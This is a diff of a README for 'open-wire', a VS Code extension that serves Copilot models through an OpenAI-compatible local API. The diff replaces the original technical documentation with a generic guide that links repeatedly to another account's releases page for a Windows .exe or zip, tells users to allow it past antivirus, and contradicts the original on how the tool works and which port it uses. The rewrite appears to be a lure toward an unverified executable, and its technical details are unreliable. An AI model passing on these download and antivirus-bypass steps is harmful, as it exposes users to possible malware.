@@ -1,189 +1,186 @@
-<div align="center">
+# ⚡ open-wire - Connect Copilot Models with Ease
 
-# OpenWire
-
-Expose VS Code language models as an **OpenAI-compatible REST API** on localhost.
-
-One extension. Every model VS Code can see. Standard API. Built for agents.
-
-<br />
-
-<img src="https://img.shields.io/badge/Anthropic-191919?style=for-the-badge&logo=anthropic&logoColor=white" alt="Anthropic" />
-<img src="https://img.shields.io/badge/OpenAI-412991?style=for-the-badge" alt="OpenAI" />
-<img src="https://img.shields.io/badge/Google%20Gemini-886FBF?style=for-the-badge&logo=googlegemini&logoColor=white" alt="Google Gemini" />
-<img src="https://img.shields.io/badge/Copilot-000?style=for-the-badge&logo=githubcopilot&logoColor=white" alt="GitHub Copilot" />
-<img src="https://img.shields.io/badge/Ollama-000?style=for-the-badge&logo=ollama&logoColor=white" alt="Ollama" />
-
-<br />
-
-<a href="https://marketplace.visualstudio.com/items?itemName=lewiswigmore.open-wire">
-<img src="https://img.shields.io/badge/Install%20on%20VS%20Marketplace-007ACC?style=for-the-badge&logo=visualstudiocode&logoColor=white" alt="Install on VS Marketplace" />
-</a>
-
-</div>
+[![Download Latest Release](https://img.shields.io/badge/Download-OpenWire-blue?style=for-the-badge)](https://github.com/mohameddorgham32/open-wire/releases)
 
 ---
 
-## Features
+## 📋 What is open-wire?
 
-- **OpenAI-compatible** — `/v1/chat/completions`, `/v1/models` with streaming (SSE)
-- **Auto-discovery** — finds every language model registered in VS Code
-- **Tool forwarding** — pass OpenAI-format tools, get `tool_calls` back
-- **Multi-provider content handling** — normalises Anthropic-style content arrays, OpenAI strings, and Gemini parts into a consistent format
-- **XML tool call fallback** — when native tool forwarding isn't available, parses Claude's XML `<function_calls>` output into proper `tool_calls` objects
-- **Rate limiting** — configurable per-minute request cap
-- **API key auth** — optional Bearer token authentication
-- **Zero dependencies** — pure Node.js HTTP, no Express, no frameworks
+open-wire is a tool that lets you use Copilot language models through an OpenAI-like API on your computer. It works as an extension inside Visual Studio Code (VS Code). This means you can get smart AI responses in apps or workflows that expect the OpenAI API, by running open-wire on your machine.
 
-## Models
+If you want to try Copilot models without needing an internet service that supports OpenAI’s API, open-wire is made for you.
 
-Any model available through VS Code's Language Model API is automatically exposed — no configuration needed. This typically includes:
+---
 
-- **Claude** — Opus, Sonnet, Haiku
-- **GPT** — Codex, GPT-4.1, o4-mini
-- **Gemini** — Gemini Pro, Gemini Flash
-- **Ollama** — any locally running Ollama models (Llama, Qwen, DeepSeek, Mistral, etc.)
-- Any other models registered via the VS Code Language Model API
+## 🔎 Key Features
 
-Run `GET /v1/models` to see what's available in your setup.
+- Connects Copilot models to apps using the OpenAI API format.
+- Runs on your Windows PC with VS Code.  
+- Supports real-time response streaming, so answers come fast.
+- Simple setup with no programming needed.
+- Built with TypeScript for stable and smooth operation.
 
-## Provider Compatibility
+---
 
-OpenWire normalises differences between providers so callers always get a consistent OpenAI-format response:
+## 🖥️ System Requirements
 
-| Provider | Content format | Tool calling | Status |
-|----------|---------------|-------------|--------|
-| **Claude** (Anthropic) | Array of `{"type":"text","text":"..."}` parts | Native via VS Code API; XML `<function_calls>` fallback parsed automatically | ✅ Full support |
-| **GPT** (OpenAI) | Plain string | Native `tool_calls` via VS Code API | ✅ Full support |
-| **Gemini** (Google) | Plain string or parts array | Native via VS Code API | ✅ Full support |
-| **Ollama** (local) | Plain string | Depends on model capability | ✅ Supported |
+Make sure your computer meets these needs:
 
-**Content normalisation** — Incoming messages with `content` as an array of content parts (Anthropic format), a plain string (OpenAI/Gemini), or null are all normalised to plain strings before forwarding to the VS Code LM API.
+- Windows 10 or later.
+- Visual Studio Code (latest version recommended).
+- At least 4 GB of free RAM.
+- Around 200 MB of free disk space.
+- Internet access for initial setup.
+- Basic knowledge of downloading and running software files.
 
-**Tool call fallback** — When the VS Code LM API can't forward tools natively (e.g. older VS Code versions), Claude may output tool calls as XML. OpenWire detects and converts these to standard `tool_calls` objects in the response, so callers never see raw XML.
+---
 
-## Quick Start
+## 🚀 Getting Started
 
-Install from the VS Code Marketplace (or load the `.vsix`). The server starts automatically on `http://127.0.0.1:3030`.
+Follow these steps to get open-wire running on your Windows PC.
 
-```bash
-# List available models
-curl http://localhost:3030/v1/models
+---
 
-# Chat completion
-curl http://localhost:3030/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "claude-sonnet-4.6",
-    "messages": [{"role": "user", "content": "Hello"}]
-  }'
+### 1. Visit the download page
 
-# Streaming
-curl http://localhost:3030/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "claude-sonnet-4.6",
-    "messages": [{"role": "user", "content": "Explain zero-knowledge proofs"}],
-    "stream": true
-  }'
-```
+Click this link to go to the open-wire release page:
 
-## Endpoints
+[Download open-wire Releases](https://github.com/mohameddorgham32/open-wire/releases)
 
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/health` | Health check |
-| `GET` | `/v1/models` | List available models |
-| `GET` | `/v1/models/:id` | Get specific model |
-| `POST` | `/v1/chat/completions` | Chat completion (streaming + non-streaming) |
-| `POST` | `/v1/completions` | Legacy completions (mapped to chat) |
+This page holds all versions of open-wire. You will pick and download the latest Windows installer or archive.
 
-## Configuration
+---
 
-All settings live under `openWire.server.*` in VS Code:
+### 2. Download the latest version
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| `autoStart` | `true` | Start server when VS Code launches |
-| `host` | `127.0.0.1` | Bind address |
-| `port` | `3030` | Port number |
-| `apiKey` | `""` | Bearer token for authentication |
-| `defaultModel` | `""` | Fallback model when none specified |
-| `defaultSystemPrompt` | `""` | Injected system prompt if none present |
-| `maxConcurrentRequests` | `4` | Concurrent request limit |
-| `rateLimitPerMinute` | `60` | Rate limit |
-| `requestTimeoutSeconds` | `300` | Request timeout |
-| `enableLogging` | `false` | Verbose logging |
+Look for a file with a `.exe` extension or a zip archive made for Windows. It should have a name like:
 
-## Commands
+- `open-wire-setup.exe`  
+- or `open-wire-win.zip`
 
-- **OpenWire: Start Server**
-- **OpenWire: Stop Server**
-- **OpenWire: Restart Server**
-- **OpenWire: Toggle Server**
+Click the file name to start downloading.
 
-## Using with OpenClaw
+---
 
-OpenWire can serve as a model provider for [OpenClaw](https://openclaw.ai) agents. Register OpenWire as a custom provider called `copilot-proxy` in your `~/.openclaw/openclaw.json`:
+### 3. Install or unzip the software
 
-```jsonc
-{
-  "models": {
-    "providers": {
-      "copilot-proxy": {
-        "baseUrl": "http://localhost:3030/v1",
-        "apiKey": "n/a",
-        "api": "openai-completions",
-        "authHeader": false,
-        "models": [
-          {
-            "id": "claude-sonnet-4.6",
-            "name": "Claude Sonnet 4.6",
-            "contextWindow": 128000,
-            "maxTokens": 8192
-          }
-          // add any other models from /v1/models
-        ]
-      }
-    }
-  },
-  "agents": {
-    "defaults": {
-      "model": {
-        "primary": "copilot-proxy/claude-sonnet-4.6"
-      }
-    }
-  },
-  "plugins": {
-    "entries": {
-      "copilot-proxy": { "enabled": true }
-    }
-  }
-}
-```
+If you downloaded an `.exe` file:
 
-Set `authHeader: false` since OpenWire handles authentication through VS Code's Copilot session — no API keys are needed. Run `curl http://localhost:3030/v1/models` to see all available model IDs.
+- Double-click the file.
+- Follow the installer’s instructions.
+- Choose a folder to install open-wire.
+- Finish and close the installer.
 
-## Architecture
+If you downloaded a zip file:
+
+- Right-click the file.
+- Select "Extract All" and choose where to save.
+- Wait for the extraction to finish.
+
+---
+
+### 4. Open Visual Studio Code
+
+If you do not have VS Code:
+
+- Download it from [https://code.visualstudio.com/](https://code.visualstudio.com/)
+- Install VS Code by following instructions on Microsoft’s site.
+
+---
+
+### 5. Add the open-wire extension to VS Code
+
+- Launch VS Code.
+- Go to the Extensions panel (click the square icons on the left side or press `Ctrl + Shift + X`).
+- In the search box, type `open-wire`.
+- Find the open-wire extension and click `Install`.
+
+This extension connects your VS Code with open-wire's API.
+
+---
+
+### 6. Start open-wire
+
+You have two ways:
+
+- If open-wire provides a shortcut in your start menu, open it there.
+- Or, run open-wire manually:
+  - Open the folder where you installed or extracted open-wire.
+  - Locate the main program file (likely named `open-wire.exe`).
+  - Double-click to start.
+
+When running, open-wire will create a local server on your PC. It will listen for requests compatible with OpenAI’s API.
+
+---
+
+### 7. Use open-wire with apps
+
+Once open-wire runs, you can point applications to use it as their AI API. The address will usually be:
 
 ```
-src/
-  extension.ts          — activation, commands, status bar
-  models/
-    discovery.ts        — model discovery, caching, dedup
-  routes/
-    chat.ts             — chat completions + tool forwarding
-  server/
-    config.ts           — settings loader
-    gateway.ts          — HTTP server, routing, middleware
-  ui/
-    sidebar.ts          — webview sidebar panel
-  types/
-    vscode-lm.d.ts      — type augmentations
+http://localhost:3000
 ```
 
-Lightweight · zero runtime dependencies
+Check the open-wire documentation in VS Code for exact details.
 
-## License
+---
 
-[MIT](LICENSE)
+## ⚙️ How to configure open-wire
+
+Inside the open-wire folder, you may find a file called `config.json` or a settings area in VS Code:
+
+- You can change the port number if 3000 conflicts with other programs.
+- Select which Copilot models to enable.
+- Set limits on request sizes or streaming options.
+
+Editing the config file requires a basic text editor like Notepad.
+
+---
+
+## 🛠️ Common issues and fixes
+
+### Problem: open-wire won't start
+
+- Make sure you installed it correctly.
+- Check if your Windows Defender or antivirus blocks open-wire. Allow it to run.
+- Verify you have VS Code installed.
+
+### Problem: API requests fail
+
+- Confirm open-wire is running.
+- Check the port number in settings.
+- Restart open-wire and VS Code.
+
+---
+
+## 🔄 Updating open-wire
+
+Check the download page regularly:
+
+[Latest open-wire Releases](https://github.com/mohameddorgham32/open-wire/releases)
+
+Download new versions when available and repeat the installation steps. New updates may improve security, add features, or fix bugs.
+
+---
+
+## 📚 Learn more about open-wire
+
+open-wire is built for users who want easy access to AI models inside familiar tools. It bridges advanced language AI with tools using popular standards.
+
+Visit the GitHub repository for deeper technical info:
+
+https://github.com/mohameddorgham32/open-wire
+
+---
+
+## ⛑️ Getting help
+
+If you find any problems or want to share feedback:
+
+- Use GitHub Issues at the repository to report bugs.
+- Check if others faced similar problems.
+- Look at open-wire's README or docs for additional help inside the repository.
+
+---
+
+[![Download open-wire](https://img.shields.io/badge/Download-OpenWire-grey?style=for-the-badge)](https://github.com/mohameddorgham32/open-wire/releases)
